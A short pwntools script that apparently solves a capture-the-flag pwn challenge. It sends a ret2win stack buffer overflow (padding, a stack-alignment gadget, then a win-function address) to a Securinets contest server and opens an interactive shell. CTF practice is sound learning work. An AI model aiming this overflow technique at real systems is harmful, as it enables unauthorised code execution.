from pwn import *
context.log_level = 'debug'

#p = process('./winner1')
p = remote('pwn.ctf.securinets.tn', '8899')

ret = 0x000000000040101a
win = 0x40127b

payload =  b"a"*136 
payload += p64(ret) # Stack alignment
payload += p64(win)

p.sendlineafter(b'input: ',payload)
#p.sendline(payload)
p.interactive()
